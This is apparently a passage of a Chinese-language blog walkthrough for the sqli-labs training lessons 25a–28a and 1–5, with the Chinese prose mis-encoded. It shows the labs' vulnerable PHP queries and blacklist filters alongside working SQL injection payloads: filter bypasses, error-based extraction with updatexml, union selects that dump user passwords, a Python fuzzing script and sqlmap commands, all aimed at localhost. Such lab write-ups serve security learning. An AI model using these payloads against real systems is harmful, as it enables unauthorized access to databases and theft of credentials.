<h3 id="25a-or-andè¢«è¿‡æ»¤"><a href="#25a-or-andè¢«è¿‡æ»¤" class="headerlink" title="25a or andè¢«è¿‡æ»¤"></a>25a <code>or</code> <code>and</code>è¢«è¿‡æ»¤</h3><figure class="highlight"><table><tr><td class="code"><pre><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> blacklist($id)</span><br><span class="line">&#123;</span><br><span class="line">	$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/or/i&#x27;</span>,&quot;&quot;, $id);			<span class="operator">/</span><span class="operator">/</span>strip <span class="keyword">out</span> <span class="keyword">OR</span> (non <span class="keyword">case</span> <span class="keyword">sensitive</span>)</span><br><span class="line">	$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/AND/i&#x27;</span>,&quot;&quot;, $id);		<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="keyword">AND</span> (non <span class="keyword">case</span> <span class="keyword">sensitive</span>)</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<br>

<p>å’Œ25ç›¸æ¯” å°‘äº†<code>&#39;</code></p>
<p><code>?id=1 oorrder by 3</code></p>
<p><code>?id=0 union select 1,database(),3</code></p>
<br>

<h3 id="26-or-and-ç©ºæ ¼å’Œæ–œæ è¢«è¿‡æ»¤"><a href="#26-or-and-ç©ºæ ¼å’Œæ–œæ è¢«è¿‡æ»¤" class="headerlink" title="26 or/and/*/-/#/ç©ºæ ¼å’Œæ–œæ è¢«è¿‡æ»¤"></a>26 <code>or/and/*/-/#/ç©ºæ ¼</code>å’Œæ–œæ è¢«è¿‡æ»¤</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">	$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> blacklist($id)</span><br><span class="line">&#123;</span><br><span class="line">	$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/or/i&#x27;</span>,&quot;&quot;, $id);			<span class="operator">/</span><span class="operator">/</span>strip <span class="keyword">out</span> <span class="keyword">OR</span> (non <span class="keyword">case</span> <span class="keyword">sensitive</span>)</span><br><span class="line">	$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/and/i&#x27;</span>,&quot;&quot;, $id);		<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="keyword">AND</span> (non <span class="keyword">case</span> <span class="keyword">sensitive</span>)</span><br><span class="line">	$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[\/\*]/&#x27;</span>,&quot;&quot;, $id);		<span class="operator">/</span><span class="operator">/</span>strip <span class="keyword">out</span> <span class="operator">/</span> <span class="operator">*</span></span><br><span class="line">	$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[--]/&#x27;</span>,&quot;&quot;, $id);		<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="comment">--</span></span><br><span class="line">	$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[#]/&#x27;</span>,&quot;&quot;, $id);			<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> #</span><br><span class="line">	$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[\s]/&#x27;</span>,&quot;&quot;, $id);		<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> spaces</span><br><span class="line">	$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[\/\\\\]/&#x27;</span>,&quot;&quot;, $id);		<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> slashes</span><br><span class="line">	<span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<br>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">changeToHex</span>(<span class="params">num</span>):</span></span><br><span class="line">    tmp = <span class="built_in">hex</span>(i).replace(<span class="string">&quot;0x&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(tmp)&lt;<span class="number">2</span>:</span><br><span class="line">        tmp = <span class="string">&#x27;0&#x27;</span> + tmp</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;%&quot;</span> + tmp</span><br><span class="line"></span><br><span class="line">req = requests.session()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>,<span class="number">256</span>):</span><br><span class="line">    i = changeToHex(i) </span><br><span class="line">    url = <span class="string">&quot;http://localhost/sqli-labs/Less-26/?id=1&#x27;&quot;</span> + i + <span class="string">&quot;%26%26&quot;</span> + i + <span class="string">&quot;&#x27;1&#x27;=&#x27;1&quot;</span>     </span><br><span class="line">    ret = req.get(url)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;Dumb&#x27;</span> <span class="keyword">in</span> ret.content:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;good,this can use:&quot;</span> + i</span><br><span class="line">        </span><br><span class="line"><span class="comment">#good,this can use:%09</span></span><br><span class="line"><span class="comment">#good,this can use:%0a</span></span><br><span class="line"><span class="comment">#good,this can use:%0b</span></span><br><span class="line"><span class="comment">#good,this can use:%0c</span></span><br><span class="line"><span class="comment">#good,this can use:%0d</span></span><br><span class="line"><span class="comment">#good,this can use:%20</span></span><br><span class="line"><span class="comment">#good,this can use:%22</span></span><br><span class="line"><span class="comment">#good,this can use:%23</span></span><br><span class="line"><span class="comment">#good,this can use:%27</span></span><br><span class="line"><span class="comment">#good,this can use:%2a</span></span><br><span class="line"><span class="comment">#good,this can use:%2d</span></span><br><span class="line"><span class="comment">#good,this can use:%2f</span></span><br><span class="line"><span class="comment">#good,this can use:%5c</span></span><br></pre></td></tr></table></figure>

<p><code>%20(ç©ºæ ¼)ã€%23(#)ã€%2a(*)ã€%2d(-)ã€%2f(/)ã€%5c(\)ï¼Œ%09-%0déƒ½æ˜¯åˆ¶è¡¨ç¬¦ã€æ¢è¡Œç¬¦ã€æ¢é¡µç¬¦</code></p>
<p>ä½†æ˜¯è¿™ä¸ªé¢˜åœ¨linuxç¯å¢ƒä¸‹å¯ä»¥è§£æ<code>%a0</code>windowsä¸‹å°±æ— æ³•è§£æ</p>
<p>è¿™ä¸€å…³æœ‰ä¸‰ç§æ³¨å…¥æ–¹å¼:</p>
<ul>
<li>union select è”åˆæ³¨å…¥ï¼Œç”¨ç‰¹æ®Šç¼–ç ç¬¦ä»£æ›¿ç©ºæ ¼</li>
<li>æŠ¥é”™æ³¨å…¥ï¼Œä¸ºäº†é¿å¼€ç©ºæ ¼ï¼Œé€‰æ‹©ä½¿ç”¨<code>updatexml()</code>å’Œ<code>extractvalue()</code></li>
<li>Boolç›²æ³¨ï¼Œæ„é€ é¿å¼€ç©ºæ ¼çš„è¯­å¥</li>
</ul>
<p>ä½¿ç”¨<code>||</code>æ›¿æ¢<code>and</code></p>
<p><code>?id=1&#39;||&#39;1&#39;=&#39;1</code></p>
<p><code>?id=0&#39;||updatexml(1,concat(0x7e,(database()),0x7e),1)||&#39;1&#39;=&#39;1</code></p>
<p><code>?id=0&#39;||updatexml(1,concat(0x7e,(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_schema=&#39;security&#39;)),0x7e),1)||&#39;1&#39;=&#39;1</code></p>
<br>

<h3 id="26a-or-and-ç©ºæ ¼å’Œæ–œæ è¢«è¿‡æ»¤"><a href="#26a-or-and-ç©ºæ ¼å’Œæ–œæ è¢«è¿‡æ»¤" class="headerlink" title="26a  or/and/*/-/#/ç©ºæ ¼å’Œæ–œæ è¢«è¿‡æ»¤"></a>26a  <code>or/and/*/-/#/ç©ºæ ¼</code>å’Œæ–œæ è¢«è¿‡æ»¤</h3><figure class="highlight"><table><tr><td class="code"><pre><span class="line">	$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=(&#x27;$id&#x27;) LIMIT 0,1&quot;;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">function</span> blacklist($id)</span><br><span class="line">&#123;</span><br><span class="line">	$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/or/i&#x27;</span>,&quot;&quot;, $id);			<span class="operator">/</span><span class="operator">/</span>strip <span class="keyword">out</span> <span class="keyword">OR</span> (non <span class="keyword">case</span> <span class="keyword">sensitive</span>)</span><br><span class="line">	$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/and/i&#x27;</span>,&quot;&quot;, $id);		<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="keyword">AND</span> (non <span class="keyword">case</span> <span class="keyword">sensitive</span>)</span><br><span class="line">	$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[\/\*]/&#x27;</span>,&quot;&quot;, $id);		<span class="operator">/</span><span class="operator">/</span>strip <span class="keyword">out</span> <span class="operator">/</span> <span class="operator">*</span></span><br><span class="line">	$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[--]/&#x27;</span>,&quot;&quot;, $id);		<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="comment">--</span></span><br><span class="line">	$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[#]/&#x27;</span>,&quot;&quot;, $id);			<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> #</span><br><span class="line">	$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[\s]/&#x27;</span>,&quot;&quot;, $id);		<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> spaces</span><br><span class="line">	$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[\s]/&#x27;</span>,&quot;&quot;, $id);		<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> spaces</span><br><span class="line">	$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[\/\\\\]/&#x27;</span>,&quot;&quot;, $id);		<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> slashes</span><br><span class="line">	<span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>?id=1&#39;)||(&#39;1&#39;=&#39;1</code></p>
<br>

<br>

<h3 id="27-ç©ºæ ¼-union-selectè¢«è¿‡æ»¤"><a href="#27-ç©ºæ ¼-union-selectè¢«è¿‡æ»¤" class="headerlink" title="27 */-/#/ç©ºæ ¼/*/union/selectè¢«è¿‡æ»¤"></a>27 <code>*/-/#/ç©ºæ ¼/*/union/select</code>è¢«è¿‡æ»¤</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">	$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;</span><br><span class="line">	</span><br><span class="line"><span class="keyword">function</span> blacklist($id)</span><br><span class="line">&#123;</span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[\/\*]/&#x27;</span>,&quot;&quot;, $id);		<span class="operator">/</span><span class="operator">/</span>strip <span class="keyword">out</span> <span class="operator">/</span> <span class="operator">*</span></span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[--]/&#x27;</span>,&quot;&quot;, $id);		<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="comment">--.</span></span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[#]/&#x27;</span>,&quot;&quot;, $id);			<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> #.</span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[ +]/&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> spaces.</span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/select/m&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> spaces.</span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[ +]/&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> spaces.</span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/union/s&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="keyword">union</span></span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/select/s&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="keyword">select</span></span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/UNION/s&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="keyword">UNION</span></span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/SELECT/s&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="keyword">SELECT</span></span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/Union/s&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="keyword">Union</span></span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/Select/s&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="keyword">select</span></span><br><span class="line"><span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>?id=0%27%a0unIon%a0sElect%a01,2,%273</code></p>
<p><code>?id=0%27%a0unIon%a0sElect%a01,(sElect%a0group_concat(password)from%a0users)%20,%273</code></p>
<br>

<br>

<h3 id="27a-ç©ºæ ¼-union-selectè¢«è¿‡æ»¤"><a href="#27a-ç©ºæ ¼-union-selectè¢«è¿‡æ»¤" class="headerlink" title="27a */-/#/ç©ºæ ¼/*/union/selectè¢«è¿‡æ»¤"></a>27a <code>*/-/#/ç©ºæ ¼/*/union/select</code>è¢«è¿‡æ»¤</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">	$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">function</span> blacklist($id)</span><br><span class="line">&#123;</span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[\/\*]/&#x27;</span>,&quot;&quot;, $id);		<span class="operator">/</span><span class="operator">/</span>strip <span class="keyword">out</span> <span class="operator">/</span> <span class="operator">*</span></span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[--]/&#x27;</span>,&quot;&quot;, $id);		<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="comment">--.</span></span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[#]/&#x27;</span>,&quot;&quot;, $id);			<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> #.</span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[ +]/&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> spaces.</span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/select/m&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> spaces.</span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[ +]/&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> spaces.</span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/union/s&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="keyword">union</span></span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/select/s&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="keyword">select</span></span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/UNION/s&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="keyword">UNION</span></span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/SELECT/s&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="keyword">SELECT</span></span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/Union/s&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="keyword">Union</span></span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/Select/s&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="keyword">Select</span></span><br><span class="line"><span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>?id=1&quot; ||&quot;1&quot;=&quot;1</code> åŒå¼•å·é—­åˆ</p>
<p><code>?id=0%22%20UnIon%a0SeLect%a01,2,3%22</code></p>
<p><code>?id=0%22%20UnIon%a0SeLect%a01,(SeLect%a0group_concat(password)from%a0users),3%22</code></p>
<br>

<h3 id="28-ç©ºæ ¼-union-selectè¢«è¿‡æ»¤"><a href="#28-ç©ºæ ¼-union-selectè¢«è¿‡æ»¤" class="headerlink" title="28*/-/#/+/ç©ºæ ¼/union/selectè¢«è¿‡æ»¤"></a>28<code>*/-/#/+/ç©ºæ ¼/union/select</code>è¢«è¿‡æ»¤</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">	$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=(&#x27;$id&#x27;) LIMIT 0,1&quot;;</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line"><span class="keyword">function</span> blacklist($id)</span><br><span class="line">&#123;</span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[\/\*]/&#x27;</span>,&quot;&quot;, $id);				<span class="operator">/</span><span class="operator">/</span>strip <span class="keyword">out</span> <span class="operator">/</span> <span class="operator">*</span></span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[--]/&#x27;</span>,&quot;&quot;, $id);				<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="comment">--.</span></span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[#]/&#x27;</span>,&quot;&quot;, $id);					<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> #.</span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[ +]/&#x27;</span>,&quot;&quot;, $id);	    		<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> spaces.</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/select/m&#x27;</span>,&quot;&quot;, $id);	   		 	<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> spaces.</span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[ +]/&#x27;</span>,&quot;&quot;, $id);	    		<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> spaces.</span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/union\s+select/i&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="keyword">UNION</span> <span class="operator">&amp;</span> SELECT.</span><br><span class="line"><span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">	</span><br></pre></td></tr></table></figure>

<p><code>id=0%27)%a0UnIon%a0SEleCt%a01,2,(%273</code></p>
<br>

<h3 id="28a-ç©ºæ ¼-union-selectè¢«è¿‡æ»¤"><a href="#28a-ç©ºæ ¼-union-selectè¢«è¿‡æ»¤" class="headerlink" title="28a */-/#/+/ç©ºæ ¼/union/selectè¢«è¿‡æ»¤"></a>28a <code>*/-/#/+/ç©ºæ ¼/union/select</code>è¢«è¿‡æ»¤</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">	$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=(&#x27;$id&#x27;) LIMIT 0,1&quot;;</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line"><span class="keyword">function</span> blacklist($id)</span><br><span class="line">&#123;</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[\/\*]/&#x27;</span>,&quot;&quot;, $id);				<span class="operator">/</span><span class="operator">/</span>strip <span class="keyword">out</span> <span class="operator">/</span> <span class="operator">*</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[--]/&#x27;</span>,&quot;&quot;, $id);				<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="comment">--.</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[#]/&#x27;</span>,&quot;&quot;, $id);					<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> #.</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[ +]/&#x27;</span>,&quot;&quot;, $id);	    		<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> spaces.</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/select/m&#x27;</span>,&quot;&quot;, $id);	   		 	<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> spaces.</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[ +]/&#x27;</span>,&quot;&quot;, $id);	    		<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> spaces.</span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/union\s+select/i&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> spaces.</span><br><span class="line"><span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>id=0%27)%a0UnIon%a0SEleCt%a01,2,(%273</code></p>
]]></content>
      <categories>
        <category>SQLi</category>
      </categories>
      <tags>
        <tag>SQLi</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs1</title>
    <url>/posts/2b9109b5/</url>
    <content><![CDATA[<p><code>union select 1,2,table_name from information_schema.tables where table_schema = database() limit 0,1 </code>æŸ¥å­—æ®µ</p>
<p><code>union select 1,2,column_name from information_schema.columns where table_schema=database() and table_name=&#39;è¡¨å&#39; limit 0,1</code></p>
<h3 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>

<p>ç”¨<code>&#39;</code>é—­åˆ</p>
<p><code>id = 1&#39; --+</code></p>
<p><code>id =1&#39; order by 4 --+</code> #æŠ¥é”™ è¯´æ˜æœ‰ä¸‰ä¸ªå­—æ®µ</p>
<p><code>id = 1.9999&#39; and union select 1,2,3  --+ </code>  2,3æ˜¯è¾“å‡ºç‚¹</p>
<p><code>id=1.9999&#39; and union select 1,2,table_name from information_schema.tables where table_schema=database() limit 0,1 --+</code>æŸ¥è¡¨å</p>
<p><code>id=-1&#39; union select 1,2,column_name from information_schema.columns where table_schema=database() and table_name=&#39;users&#39; limit 1,1--+</code> æŸ¥å­—æ®µ</p>
<p><code>?id=-1&#39; union select 1,username,password from users limit 1,1--+</code> æŸ¥è´¦å·å¯†ç </p>
<p>SQLmap</p>
<p><code>python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs/Less-1/?id=1&quot; --dbs --batch --tables</code></p>
<p>åŠ äº†<code>--batch</code> sqlmapä¸ä¼šè¯¢é—®ä½ è¾“å…¥ å…¨éƒ¨é»˜è®¤ç¡®å®š</p>
<h3 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>

<br>

<p><code>id=1 and 1=1 union select 1,2, table_name from information_schema.tables where table_schema=database() limit 1,1 --+</code> æŸ¥è¡¨å</p>
<p><code>id=1 and 1=1 union select 1,2,column_name from information_schema.columns where table_schema=database() and table_name=&#39;users&#39; limit 0,1--+</code> æŸ¥å­—æ®µ</p>
<br>

<p>SQLmap</p>
<p><code>python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs/Less-2/?id=1&quot; --dbs --batch --tables</code></p>
<br>

<br>

<h3 id="3"><a href="#3" class="headerlink" title="3."></a>3.</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=(&#x27;$id&#x27;) LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>

<p>ç”¨<code>&#39;)</code>é—­åˆ</p>
<p><code>id=1&#39;) and 1=1 --+</code></p>
<p><code>id=1.999&#39;)  and 1=1 union select 1,2,table_name from information_schema.tables where table_schema=database() limit 1,1 --+</code></p>
<p><code>id=1.999&#39;)  and 1=1 union select 1,2,column_name from information_schema.columns where table_schema=database() and table_name=&#39;users&#39; limit 0,1 --+</code></p>
<p>SQLmap</p>
<p><code>python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs/Less-3/?id=1&quot; --dbs --batch</code></p>
<br>

<h3 id="4"><a href="#4" class="headerlink" title="4."></a>4.</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=($id) LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>

<p>ç”¨<code>&quot;)</code>é—­åˆ</p>
<p>SQLmap</p>
<p><code>python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs/Less-4/?id=1&quot; --dbs --batch</code></p>
<br>

<h3 id="5-æŠ¥é”™æ³¨å…¥"><a href="#5-æŠ¥é”™æ³¨å…¥" class="headerlink" title="5.æŠ¥é”™æ³¨å…¥"></a>5.æŠ¥é”™æ³¨å…¥</h3><figure class="highlight"><table><tr><td class="code"><pre><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;</span><br><span class="line">$<span class="keyword">result</span><span class="operator">=</span>mysql_query($<span class="keyword">sql</span>);</span><br><span class="line">$<span class="type">row</span> <span class="operator">=</span> mysql_fetch_array($<span class="keyword">result</span>);</span><br><span class="line"></span><br><span class="line">	if($<span class="type">row</span>)</span><br><span class="line">	&#123;</span><br><span class="line">  	echo <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;	</span><br><span class="line">  	echo <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line">  	echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">    	echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">  	&#125;</span><br><span class="line">	<span class="keyword">else</span> </span><br><span class="line">	&#123;</span><br><span class="line">	</span><br><span class="line">	echo <span class="string">&#x27;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">	print_r(mysql_error());</span><br><span class="line">	echo &quot;&lt;/br&gt;&lt;/font&gt;&quot;;	</span><br><span class="line">	echo <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;</span>;	</span><br><span class="line">	</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p><code>id=1&#39; --+</code>é¡µé¢æ­£å¸¸ è¯´æ˜ç”¨ <code>&#39;</code>é—­åˆ</p>
<p><code>id=1&#39;  and 1=1 --+</code> æœ‰å›æ˜¾</p>
<p><code>id=1&#39;  and 1=2 --+</code>æ— å›æ˜¾</p>
<p>æŸ¥çœ‹ä»£ç ï¼Œå‘ç°åªè¦è¯­å¥æ‰§è¡ŒæˆåŠŸå°±ä¼šè¿”å›â€™You are in â€¦â€¦..â€™</p>
<p>å¯ä»¥è€ƒè™‘ä½¿ç”¨æŠ¥é”™æ³¨å…¥æˆ–è€…å¸ƒå°”ç›²æ³¨</p>
